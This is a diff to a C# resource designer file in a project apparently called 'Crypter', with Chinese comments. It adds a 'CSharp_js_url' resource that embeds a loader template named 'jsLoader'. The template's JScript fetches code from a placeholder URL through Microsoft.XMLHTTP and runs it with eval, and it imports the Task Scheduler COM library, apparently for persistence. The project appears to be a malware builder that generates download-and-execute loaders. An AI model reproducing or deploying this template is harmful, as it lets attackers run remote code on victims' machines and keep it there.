@@ -188,6 +188,31 @@ namespace Crypter.Properties {
         ///   查找类似 using System;
         ///using System.Diagnostics;
         ///using System.IO;
+        ///using System.Security.Cryptography;
+        ///using System.Text;
+        ///using TaskScheduler;//记得加入COM组件TaskSchedulerClass Type Library
+        /////引用taskchd.dll后选中按下F4在属性中将 嵌入互操作类型 改为 False
+        ///
+        ///namespace jsLoader
+        ///{
+        ///    class Program
+        ///    {
+        ///        static string v1gf8hg16cx1d = @&quot;var xml=new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;);xml.open(&apos;GET&apos;,&apos;123456&apos;,false);xml.send();var aaa=xml.responseText;eval(aaa);&quot;;
+        ///        
+        ///        static void Main(string[] args)
+        ///        {
+        ///     [字符串的其余部分被截断]&quot;; 的本地化字符串。
+        /// </summary>
+        internal static string CSharp_js_url {
+            get {
+                return ResourceManager.GetString("CSharp_js_url", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   查找类似 using System;
+        ///using System.Diagnostics;
+        ///using System.IO;
         ///using System.Net;
         ///using System.Threading;
         ///
